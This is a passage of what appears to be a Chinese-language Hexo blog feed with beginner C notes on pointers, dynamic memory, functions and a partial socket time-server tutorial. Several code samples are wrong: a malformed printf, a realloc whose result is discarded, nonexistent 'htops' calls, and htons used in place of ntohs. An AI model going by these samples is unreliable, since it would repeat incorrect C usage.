<span class="token punctuation">{</span>    int a <span class="token operator">=</span> 2<span class="token punctuation">;</span>    g<span class="token punctuation">(</span><span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    printf<span class="token punctuation">(</span><span class="token string">"%d\n"</span>,a<span class="token punctuation">)</span><span class="token punctuation">;</span>//最终输出为1    <span class="token keyword">return</span> 0<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="指针使函数返回一个以上值"><a href="#指针使函数返回一个以上值" class="headerlink" title="指针使函数返回一个以上值"></a>指针使函数返回一个以上值</h4><pre class=" language-bash"><code class="language-bash">int g<span class="token punctuation">(</span>int * p,int * q<span class="token punctuation">)</span><span class="token punctuation">{</span>    *p <span class="token operator">=</span> 1<span class="token punctuation">;</span>    *q <span class="token operator">=</span> 2<span class="token punctuation">;</span><span class="token punctuation">}</span>int main<span class="token punctuation">(</span>void<span class="token punctuation">)</span><span class="token punctuation">{</span>   int a<span class="token operator">=</span>3,b<span class="token operator">=</span>4<span class="token punctuation">;</span>   g<span class="token punctuation">(</span><span class="token operator">&amp;</span>a,<span class="token operator">&amp;</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>   printf<span class="token punctuation">(</span><span class="token string">"%d/n"</span>,a,b<span class="token punctuation">)</span><span class="token punctuation">;</span>//a<span class="token operator">=</span>1,b<span class="token operator">=</span>2   <span class="token keyword">return</span> 0<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="指针和结构体"><a href="#指针和结构体" class="headerlink" title="指针和结构体"></a>指针和结构体</h3><h2 id="动态内存分配"><a href="#动态内存分配" class="headerlink" title="动态内存分配"></a>动态内存分配</h2><h3 id="传统数组的缺点-静态数组"><a href="#传统数组的缺点-静态数组" class="headerlink" title="传统数组的缺点(静态数组)"></a>传统数组的缺点(静态数组)</h3><ul><li>数组长度必须事先指定，且只能是常熟，不能是变量</li><li>传统形式定义的数组内存无法手动释放，只能在函数运行完毕时由系统自动释放</li><li>数组的长度不能在函数运行的过程中动态的扩充或缩小</li><li>A函数定义的数组，在A函数运行期间可以被其他函数使用，但A函数运行完毕后，A函数中的数组将无法再被其他函数使用(不能跨函数使用)</li></ul><h3 id="为什么需要动态分配内存"><a href="#为什么需要动态分配内存" class="headerlink" title="为什么需要动态分配内存"></a>为什么需要动态分配内存</h3><p>动态数组很好的解决了传统数组的4个缺陷</p><p>###　动态内存分配举例(动态数组的构造)</p><h4 id="malloc函数的使用"><a href="#malloc函数的使用" class="headerlink" title="malloc函数的使用"></a>malloc函数的使用</h4><p>malloc 是memory allocate(内存分配)的缩写</p><pre class=" language-bash"><code class="language-bash">int i <span class="token operator">=</span> 5<span class="token punctuation">;</span>//静态分配4个字节int * p <span class="token operator">=</span> <span class="token punctuation">(</span>int *<span class="token punctuation">)</span>malloc<span class="token punctuation">(</span>4<span class="token punctuation">)</span><span class="token punctuation">;</span>//4表示请求系统为本程序分配4个字节//一个分配了8个字节，p占用4个字节，p所指向的内存也占4个字节//p本身所占的内存是静态分配的，p所指向的内存是动态分配的* p <span class="token operator">=</span>5<span class="token punctuation">;</span>free<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>//表示把p所指向的内存释放掉，p本身的内存是静态的，只能在p变量所在函数运行终止时由系统自动释放</code></pre><blockquote><p>注：1.使用malloc函数必须加上malloc.h头文件<br>      2.malloc函数只能返回第一个字节的地址<br>      3.malloc函数只有一个形参，并且形参是整形</p></blockquote><h4 id="动态构建一维数组"><a href="#动态构建一维数组" class="headerlink" title="动态构建一维数组"></a>动态构建一维数组</h4><pre class=" language-bash"><code class="language-bash">int * pArr<span class="token punctuation">;</span>int len<span class="token punctuation">;</span>int i<span class="token punctuation">;</span>printf<span class="token punctuation">(</span><span class="token string">"请输入数组元素个数："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>scanf<span class="token punctuation">(</span><span class="token string">"%d"</span>,<span class="token operator">&amp;</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>pArr <span class="token operator">=</span> <span class="token punctuation">(</span>int *<span class="token punctuation">)</span>malloc<span class="token punctuation">(</span>4*len<span class="token punctuation">)</span><span class="token punctuation">;</span>//每4个字节代表一个元素<span class="token punctuation">(</span>int为4个字节<span class="token punctuation">)</span>//对动态一维数组进行赋值for<span class="token punctuation">(</span>i<span class="token operator">=</span>0<span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i++<span class="token punctuation">)</span><span class="token punctuation">{</span>  scanf<span class="token punctuation">(</span><span class="token string">"%d"</span>,pArr+i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>//对动态一维数组进行输出for<span class="token punctuation">(</span>i<span class="token operator">=</span>0<span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i++<span class="token punctuation">)</span><span class="token punctuation">{</span>  printf<span class="token punctuation">(</span><span class="token string">"%d\n"</span>,*<span class="token punctuation">(</span>pArr+i<span class="token punctuation">))</span><span class="token punctuation">;</span><span class="token punctuation">}</span>realloc<span class="token punctuation">(</span>pArr,100<span class="token punctuation">)</span><span class="token punctuation">;</span>//把pArr指针所指向的内存扩大到100个字节free<span class="token punctuation">(</span>pArr<span class="token punctuation">)</span><span class="token punctuation">;</span>//释放pArr所指向的内存</code></pre><h3 id="静态内存和动态内存的比较"><a href="#静态内存和动态内存的比较" class="headerlink" title="静态内存和动态内存的比较"></a>静态内存和动态内存的比较</h3><h4 id="静态内存"><a href="#静态内存" class="headerlink" title="静态内存"></a>静态内存</h4><ul><li>静态内存是由系统自动分配的，由系统自动释放</li><li>静态内存是在栈中分配的</li></ul><h4 id="动态内存"><a href="#动态内存" class="headerlink" title="动态内存"></a>动态内存</h4><ul><li>动态内存手动分配，手动释放</li><li>动态内存是在堆中分配的</li></ul><h3 id="跨函数使用内存的问题"><a href="#跨函数使用内存的问题" class="headerlink" title="跨函数使用内存的问题"></a>跨函数使用内存的问题</h3><pre class=" language-bash"><code class="language-bash">void f<span class="token punctuation">(</span>int ** q<span class="token punctuation">)</span><span class="token punctuation">{</span>    int i <span class="token operator">=</span> 5<span class="token punctuation">;</span>    *q <span class="token operator">=</span> <span class="token operator">&amp;</span>i<span class="token punctuation">;</span><span class="token punctuation">}</span>int main<span class="token punctuation">(</span>void<span class="token punctuation">)</span><span class="token punctuation">{</span>  int * p<span class="token punctuation">;</span>  f<span class="token punctuation">(</span><span class="token operator">&amp;</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>  printf<span class="token punctuation">(</span><span class="token string">"%d\n"</span>,*p<span class="token punctuation">)</span><span class="token punctuation">;</span>//error,语法无错误，但是i变量的内存在f<span class="token punctuation">(</span><span class="token punctuation">)</span>函数执行完毕后已经被释放<span class="token punctuation">(</span>i已经不存在<span class="token punctuation">)</span>，此时*p指向的并不是i  <span class="token keyword">return</span> 0<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-bash"><code class="language-bash">void f<span class="token punctuation">(</span>int ** q<span class="token punctuation">)</span><span class="token punctuation">{</span>  * q <span class="token operator">=</span> <span class="token punctuation">(</span>int *<span class="token punctuation">)</span>malloc<span class="token punctuation">(</span>sizeof<span class="token punctuation">(</span>int<span class="token punctuation">))</span><span class="token punctuation">;</span>  ** q <span class="token operator">=</span> 5<span class="token punctuation">;</span>//等价于*p<span class="token operator">=</span>5<span class="token punctuation">}</span>int main<span class="token punctuation">(</span>void<span class="token punctuation">)</span><span class="token punctuation">{</span>   int * p<span class="token punctuation">;</span>   f<span class="token punctuation">(</span><span class="token operator">&amp;</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>   printf<span class="token punctuation">(</span><span class="token string">"%d\n"</span>,*p<span class="token punctuation">)</span><span class="token punctuation">;</span>//OK,动态分配的内存是手动释放，f<span class="token punctuation">(</span><span class="token punctuation">)</span>中的** q在函数执行完毕后依然存在<span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言(四)</title>
      <link href="/2019/08/09/c-4/"/>
      <url>/2019/08/09/c-4/</url>
      
        <content type="html"><![CDATA[<h2 id="C语言的函数-面向过程"><a href="#C语言的函数-面向过程" class="headerlink" title="C语言的函数(面向过程)"></a>C语言的函数(面向过程)</h2><p>函数是C语言的基本单位</p><h3 id="为什么需要函数"><a href="#为什么需要函数" class="headerlink" title="为什么需要函数"></a>为什么需要函数</h3><ul><li>避免了重复性操作</li><li>有利于程序的模块化</li></ul><h3 id="什么叫函数"><a href="#什么叫函数" class="headerlink" title="什么叫函数"></a>什么叫函数</h3><ul><li>逻辑上：能够完成特定功能的独立的代码单元</li><li>物理上：能够接收数据(也可以不接收数据)，并对接收数据进行处理，能够将数据处理的结果返回(也可以不返回结果)</li><li>总结： 函数是一个工具，它是为了解决大量类似问题而设计的</li></ul><h3 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h3><pre class=" language-bash"><code class="language-bash">函数的返回值 函数名<span class="token punctuation">(</span>函数的形参列表<span class="token punctuation">)</span><span class="token punctuation">{</span>    函数执行体<span class="token punctuation">}</span></code></pre><blockquote><p>注：如果函数名前的返回值类型与函数执行体中的return表达式不同，则最终函数返回类型以函数名前的返回类型为准。</p></blockquote><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token number">10.5</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//函数类型为int,所以f()最终返回10</span><span class="token punctuation">}</span></code></pre><h2 id="return和break的区别"><a href="#return和break的区别" class="headerlink" title="return和break的区别"></a>return和break的区别</h2><ul><li>终止被调函数，向主调函数返回表达式的值</li><li>若表达式为空，则只终止函数，不向主调函数返回任何值</li><li>break用来终止循环和switch，return用来终止被调函数</li></ul><h2 id="函数的分类"><a href="#函数的分类" class="headerlink" title="函数的分类"></a>函数的分类</h2><h3 id="有-无参函数"><a href="#有-无参函数" class="headerlink" title="有/无参函数"></a>有/无参函数</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//无参函数</span><span class="token keyword">int</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//有参函数</span></code></pre><h3 id="有-无返回值函数"><a href="#有-无返回值函数" class="headerlink" title="有/无返回值函数"></a>有/无返回值函数</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//无返回值</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//有返回值</span></code></pre><h3 id="库函数和用户自定义"><a href="#库函数和用户自定义" class="headerlink" title="库函数和用户自定义"></a>库函数和用户自定义</h3><h3 id="普通函数和主函数-main函数"><a href="#普通函数和主函数-main函数" class="headerlink" title="普通函数和主函数(main函数)"></a>普通函数和主函数(main函数)</h3><ul><li>一个主程序有且只能有一个主函数</li><li>主函数可以调用普通函数，普通函数不能调用主函数</li><li>普通函数可以相互调用</li><li>主函数是程序的入口也是程序的出口</li></ul><h2 id="函数的声明"><a href="#函数的声明" class="headerlink" title="函数的声明"></a>函数的声明</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//函数定义若放于main函数之后，需要在main函数之前先对函数进行声明</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"哈哈\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><blockquote><p>注：函数的定义应放于函数调用之前，否则应在函数调用前进行声明。<br>对库函数的声明是通过#include&lt;库函数所在的文件名&gt;实现的</p></blockquote><h2 id="形参和实参"><a href="#形参和实参" class="headerlink" title="形参和实参"></a>形参和实参</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">float</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//x,y是形参</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">8.2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//10，8.2是实参</span></code></pre><blockquote><p>注：形参与实参应满足：个数相同、位置一一对应、数据类型必须相互兼容</p></blockquote><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">g</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span>    i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">g</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//最终输出为2</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><blockquote><p>注：形参永远无法改变实参的值(以上改变变量的值的方法可以用指针实现，详情参见C语言(五)博客。</p></blockquote><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="按作用域分类"><a href="#按作用域分类" class="headerlink" title="按作用域分类"></a>按作用域分类</h3><h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><p>在所有函数外部定义的变量叫全局变量</p><h4 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h4><p>在一个函数内部定义的变量或者函数的形参都统称为局部变量</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//k是全局变量</span><span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token punctuation">}</span>   <span class="token comment" spellcheck="true">//i和j都属于局部变量</span></code></pre><blockquote><p>注：全局变量的作用域是从定义位置开始到整个程序结束，局部变量只能在本函数内部使用</p></blockquote><h4 id="全局变量与局部变量命名冲突的问题"><a href="#全局变量与局部变量命名冲突的问题" class="headerlink" title="全局变量与局部变量命名冲突的问题"></a>全局变量与局部变量命名冲突的问题</h4><p>在一个函数内部如果定义的局部变量的名字和全局变量名一样时，局部变量会屏蔽全局变量。</p><h3 id="按变量的存储方式分类"><a href="#按变量的存储方式分类" class="headerlink" title="按变量的存储方式分类"></a>按变量的存储方式分类</h3><ul><li>静态变量</li><li>自动变量</li><li>寄存器变量</li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>socket编程</title>
      <link href="/2019/08/08/socket/"/>
      <url>/2019/08/08/socket/</url>
      
        <content type="html"><![CDATA[<h2 id="网络应用程序设计模式"><a href="#网络应用程序设计模式" class="headerlink" title="网络应用程序设计模式"></a>网络应用程序设计模式</h2><h3 id="C-S-（client-server）客户端-服务器（数据量大，稳定性好）"><a href="#C-S-（client-server）客户端-服务器（数据量大，稳定性好）" class="headerlink" title="C/S （client/server）客户端/服务器（数据量大，稳定性好）"></a>C/S （client/server）客户端/服务器（数据量大，稳定性好）</h3><p>优点：协议选用灵活、QQ、LOL、先下载客户端、数据可提前缓存<br>缺点：对用户安全造成威胁、开发工作量大</p><h3 id="B-S（浏览器-服务器模式）（数据量小）"><a href="#B-S（浏览器-服务器模式）（数据量小）" class="headerlink" title="B/S（浏览器/服务器模式）（数据量小）"></a>B/S（浏览器/服务器模式）（数据量小）</h3><p>优点：使用计算机自带浏览器，较安全，只需开发服务器，客户端采用计算机自带浏览器<br>缺点：协议不可变http、QQ农场、可以跨平台（windows\linux）</p><h2 id="socket基本概念"><a href="#socket基本概念" class="headerlink" title="socket基本概念"></a>socket基本概念</h2><h3 id="客户端-client"><a href="#客户端-client" class="headerlink" title="客户端(client)"></a>客户端(client)</h3><p>或称为用户端，是指与服务器相对应，为客户提供本地服务的程序。产品或服务所指的终点、软件。</p><h3 id="服务器-server"><a href="#服务器-server" class="headerlink" title="服务器(server)"></a>服务器(server)</h3><p>对客户端发送的请求做出处理并将结果返回给客户端</p><h3 id="端口号和IP"><a href="#端口号和IP" class="headerlink" title="端口号和IP"></a>端口号和IP</h3><ul><li>Socket成对出现，数据接收端、数据发送端</li><li>端口号：在主机中唯一标识一个进程</li><li>IP：在网络环境中唯一标识一台主机</li><li>端口号+IP:在网络环境中唯一标识一个进程（socket）</li><li>使用socket必须确认IP，端口号</li></ul><h3 id="网络字节序"><a href="#网络字节序" class="headerlink" title="网络字节序"></a>网络字节序</h3><p>网络中的数据以二进制字节码流传输</p><h4 id="存储方式"><a href="#存储方式" class="headerlink" title="存储方式"></a>存储方式</h4><ul><li>大端：低地址存在高位上，高地址存在低位</li><li>小端：低地址存在低位上，高地址存在高位上(计算机)</li></ul><h4 id="字节序转换"><a href="#字节序转换" class="headerlink" title="字节序转换"></a>字节序转换</h4><p>网络数据流应采用大端字节序，计算机选用的是小端存储，当计算机传数据时，从小端到大端，所以要进行字节序转换。</p><h5 id="库函数-数字转网络字节序"><a href="#库函数-数字转网络字节序" class="headerlink" title="库函数(数字转网络字节序)"></a>库函数(数字转网络字节序)</h5><ul><li>htonl(host to network long):主机到网络IP32位</li><li>ntohl（network to host long）:网络到主机IP32位<pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#include &lt;arpa/inet.h></span>uint32_t htonl<span class="token punctuation">(</span>uint32_t hostlong<span class="token punctuation">)</span><span class="token punctuation">;</span>//32位IP，从主机到网络uint16_t htons<span class="token punctuation">(</span>uint16_t hostshort<span class="token punctuation">)</span><span class="token punctuation">;</span>//16位端口号 uint32_t ntohl<span class="token punctuation">(</span>uint32_t netlong<span class="token punctuation">)</span><span class="token punctuation">;</span>//从网络到主机uint16_t ntohs<span class="token punctuation">(</span>uint16_t netshort<span class="token punctuation">)</span>；</code></pre></li></ul><h5 id="IP地址转换函数-字符串转网络字节序"><a href="#IP地址转换函数-字符串转网络字节序" class="headerlink" title="IP地址转换函数(字符串转网络字节序)"></a>IP地址转换函数(字符串转网络字节序)</h5><ul><li>点分十进制字符串转换成网络字节序  inet_pton（IP to network）</li><li>网络字节序转换成点分十进制字符串  inet_ntop(network to IP)<pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#include &lt;arpa/inet.h></span>//af指定所用IP地址的形式<span class="token punctuation">(</span>IPV4:AF_INET,IPV6:AF_INET6<span class="token punctuation">)</span>//src指定源地址IP//dst指定目的地址IPint inet_pton<span class="token punctuation">(</span>int af, const char *src, void *dst<span class="token punctuation">)</span><span class="token punctuation">;</span>const char *inet_ntop<span class="token punctuation">(</span>int af,const void *src, char *dst, socklen_t size<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ul><h2 id="socket编程的实现"><a href="#socket编程的实现" class="headerlink" title="socket编程的实现"></a>socket编程的实现</h2><h3 id="socket框架"><a href="#socket框架" class="headerlink" title="socket框架"></a>socket框架</h3><h4 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h4><ol><li>socket() // 建立套接字</li><li>对套接字进行初始化</li><li>bind() //绑定端口号和IP(struct sockaddr_in addr)</li><li>listen() //指定最大同时发起数</li><li>accept() //阻塞等待客户端发起连接</li><li>read() //读取客户端发送来的信息(对应客户端第4步)</li><li>对客户端信息进行处理</li><li>Write() //将处理好的信息发送给客户端</li><li>Close(); //关闭套接字</li></ol><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><ol><li>socket();</li><li>bind();//可以隐式绑定</li><li>connect()；//发起连接</li><li>write();//写发送给服务器的信息</li><li>read(); //读从服务器返回的信息(对应服务器端第7步)</li><li>close();</li></ol><blockquote><p>注：程序启动时先启动服务器端，由服务器执行到第4步阻塞等待客户端发送信息，再启动客户端</p></blockquote><h3 id="客户端与服务器通信实现"><a href="#客户端与服务器通信实现" class="headerlink" title="客户端与服务器通信实现"></a>客户端与服务器通信实现</h3><ul><li>初始化缓冲区<font color="#fb8c00">char buf[]</font></li><li>通过缓冲区<font color="#fb8c00">buf</font>传信息</li><li>在服务器端对<font color="#fb8c00">buf</font>进行清零操作</li><li>每个<font color="#fb8c00">write()</font>对<font color="#fb8c00">buf</font>重新赋值，<font color="#fb8c00">read()</font>对应另一方的上一个<font color="#fb8c00">write()</font></li><li>客户端<font color="#fb8c00">write()</font>在<font color="#fb8c00">buf</font>写信息</li><li>服务器<font color="#fb8c00">read()</font>读客户端<font color="#fb8c00">buf</font>信息</li></ul><h3 id="框架函数实现"><a href="#框架函数实现" class="headerlink" title="框架函数实现"></a>框架函数实现</h3><h4 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h4><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#include &lt;sys/types.h></span><span class="token comment" spellcheck="true">#include&lt;sys/socket.h></span></code></pre><h4 id="socket"><a href="#socket" class="headerlink" title="socket()"></a>socket()</h4><p>创建套接字</p><pre class=" language-bash"><code class="language-bash">int socket<span class="token punctuation">(</span>int domain, int type, int protocol<span class="token punctuation">)</span><span class="token punctuation">;</span>//创建套接口</code></pre><ul><li>Domain:函数socket()的参数domain用于设置网络通信的域，函数socket()根据这个参数选择通信协议的族。通信协议族在文件sys/socket.h中定义</li><li>Type: 函数socket()的参数type用于设置套接字通信的类型，有SOCK_STREAM（流式套接字）、SOCK_DGRAM(数据包套接字)</li><li>Protocol: 函数socket()的第3个参数protocol用于制定某个协议的特定类型，即type类型中的某个类型。通常某协议中只有一种特定类型，这样protocol参数仅能设置为0；但是有些协议有多种特定的类型，就需要设置这个参数来选择特定的类型。</li></ul><h4 id="初始化套接字"><a href="#初始化套接字" class="headerlink" title="初始化套接字"></a>初始化套接字</h4><pre class=" language-bash"><code class="language-bash">//套接字数据结构Struct sockaddr_in<span class="token punctuation">{</span>_kernel_sa_family_t sin_family<span class="token punctuation">;</span>_be16 sin_port<span class="token punctuation">;</span>Struct <span class="token keyword">in</span> addr sin_addr<span class="token punctuation">;</span><span class="token punctuation">}</span>//初始化Struct sockaddr_in addr<span class="token punctuation">;</span>Addr.sin_family <span class="token operator">=</span>AF_NET/NET6<span class="token punctuation">;</span>Addr.sin_port <span class="token operator">=</span>htops/ntops<span class="token punctuation">;</span>Addr.sin_addr.s_addr <span class="token operator">=</span>htops<span class="token punctuation">;</span></code></pre><h4 id="bind"><a href="#bind" class="headerlink" title="bind()"></a>bind()</h4><p>对套接字绑定端口号、IP,需要进行类型强转</p><pre class=" language-bash"><code class="language-bash">int bind<span class="token punctuation">(</span>int sockfd, const struct sockaddr *addr, socklen_t addrlen<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ul><li>Sockfd:socket文件描述符</li><li>Addr:构造出IP地址加端口号(1000以下的端口给系统用，不能大于65535)</li><li>Addrlen：sizeof(addr)长度</li><li>返回值：成功返回0，失败返回-1</li></ul><h4 id="listen"><a href="#listen" class="headerlink" title="listen()"></a>listen()</h4><p>同时可以有多少个客户端与服务器建立连接，对套接字进行操作</p><pre class=" language-bash"><code class="language-bash">int listen（int sockfd, int backlog）<span class="token punctuation">;</span>//backlog最大值为128</code></pre><h4 id="accept"><a href="#accept" class="headerlink" title="accept()"></a>accept()</h4><p>阻塞等待客户端发起连接，需进行类型强转</p><pre class=" language-bash"><code class="language-bash">int accept<span class="token punctuation">(</span>int sockfd, struct sockaddr *addr，socklen_t *addrlen<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="connect"><a href="#connect" class="headerlink" title="connect()"></a>connect()</h4><p>需进行类型强转</p><pre class=" language-bash"><code class="language-bash">int connect<span class="token punctuation">(</span>int sockfd, const struct sockaddr *addr, socklen_t addrlen<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="socket编程实例"><a href="#socket编程实例" class="headerlink" title="socket编程实例"></a>socket编程实例</h2><p>客户端向服务器发送请求，服务器向客户端返回当前时间，并记录访问客户端的IP号、端口号</p><h3 id="服务器端"><a href="#服务器端" class="headerlink" title="服务器端"></a>服务器端</h3><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#include &lt;netdb.h></span><span class="token comment" spellcheck="true">#include &lt;sys/socket.h></span><span class="token comment" spellcheck="true">#include &lt;arpa/inet.h></span><span class="token comment" spellcheck="true">#include &lt;stdlib.h></span><span class="token comment" spellcheck="true">#include &lt;stdio.h></span><span class="token comment" spellcheck="true">#include &lt;string.h></span><span class="token comment" spellcheck="true">#include &lt;unistd.h></span><span class="token comment" spellcheck="true">#include &lt;time.h></span><span class="token comment" spellcheck="true">#include &lt;signal.h></span><span class="token comment" spellcheck="true">#include &lt;memory.h></span><span class="token comment" spellcheck="true">#include &lt;ctype.h></span>int sockfd<span class="token punctuation">;</span>//全局套接字描述符char IP<span class="token punctuation">[</span>16<span class="token punctuation">]</span><span class="token punctuation">;</span>char *str<span class="token punctuation">;</span>//控制ctrl c产生的信号量处理函数void signal_handler<span class="token punctuation">(</span>int signno<span class="token punctuation">)</span><span class="token punctuation">{</span>    if<span class="token punctuation">(</span>signno<span class="token operator">==</span> SIGINT<span class="token punctuation">)</span><span class="token punctuation">{</span>       printf<span class="token punctuation">(</span><span class="token string">"服务器关闭\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       close<span class="token punctuation">(</span>sockfd<span class="token punctuation">)</span><span class="token punctuation">;</span>       exit<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>//输出客户端相关信息char * out_addr<span class="token punctuation">(</span>struct sockaddr_in *client_addr<span class="token punctuation">)</span><span class="token punctuation">{</span>     //转换客户端port字节序     int port <span class="token operator">=</span> htons<span class="token punctuation">(</span>client_addr-<span class="token operator">></span>sin_port<span class="token punctuation">)</span><span class="token punctuation">;</span>     memset<span class="token punctuation">(</span>IP,0,sizeof<span class="token punctuation">(</span>IP<span class="token punctuation">))</span><span class="token punctuation">;</span>     //将ip地址从网络字节序转换成点十分进制     inet_ntop<span class="token punctuation">(</span>AF_INET,<span class="token operator">&amp;</span>client_addr-<span class="token operator">></span>sin_addr.s_addr,IP, sizeof<span class="token punctuation">(</span>IP<span class="token punctuation">))</span><span class="token punctuation">;</span>     printf<span class="token punctuation">(</span><span class="token string">"用户:%s(%d) 已连接\n"</span>,IP,port<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> IP<span class="token punctuation">;</span><span class="token punctuation">}</span>//获取时间char * do_service<span class="token punctuation">(</span>int cfd<span class="token punctuation">)</span><span class="token punctuation">{</span>     long t <span class="token operator">=</span> time<span class="token punctuation">(</span>0<span class="token punctuation">)</span><span class="token punctuation">;</span>//获得系统时间     str <span class="token operator">=</span> ctime<span class="token punctuation">(</span><span class="token operator">&amp;</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>     size_t size <span class="token operator">=</span> strlen<span class="token punctuation">(</span>str<span class="token punctuation">)</span> * sizeof<span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">;</span>     //将时间写入客户端sockaddr中     if<span class="token punctuation">(</span>write<span class="token punctuation">(</span>cfd,str,size<span class="token punctuation">)</span><span class="token operator">!=</span>size<span class="token punctuation">)</span><span class="token punctuation">{</span>        printf<span class="token punctuation">(</span><span class="token string">"写入出错"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">return</span> str<span class="token punctuation">;</span><span class="token punctuation">}</span>int main<span class="token punctuation">(</span>int argc,char *argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        //在命令行中传递端口号    if<span class="token punctuation">(</span>argc <span class="token operator">&lt;</span>2<span class="token punctuation">)</span><span class="token punctuation">{</span>       printf<span class="token punctuation">(</span><span class="token string">"usage:%s #port\n"</span>,argv<span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token 